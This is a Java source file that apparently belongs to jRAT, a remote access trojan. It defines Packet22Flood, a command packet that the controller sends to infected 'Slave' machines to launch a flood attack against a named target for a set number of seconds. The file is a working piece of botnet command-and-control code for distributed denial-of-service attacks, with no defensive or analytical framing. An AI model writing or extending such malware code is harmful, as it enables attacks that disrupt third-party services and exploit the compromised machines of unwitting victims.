package pro.jrat.packets.outgoing;

import java.io.DataOutputStream;

import pro.jrat.Slave;
import pro.jrat.common.Flood;


public class Packet22Flood extends AbstractOutgoingPacket {

	private Flood method;
	private String target;
	private int seconds;
	
	public Packet22Flood(Flood method, String target, int seconds) {
		this.method = method;
		this.target = target;
		this.seconds = seconds;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeInt(method.getNumeric());
		slave.writeLine(target);
		slave.writeInt(seconds);
	}

	@Override
	public byte getPacketId() {
		return 22;
	}

}
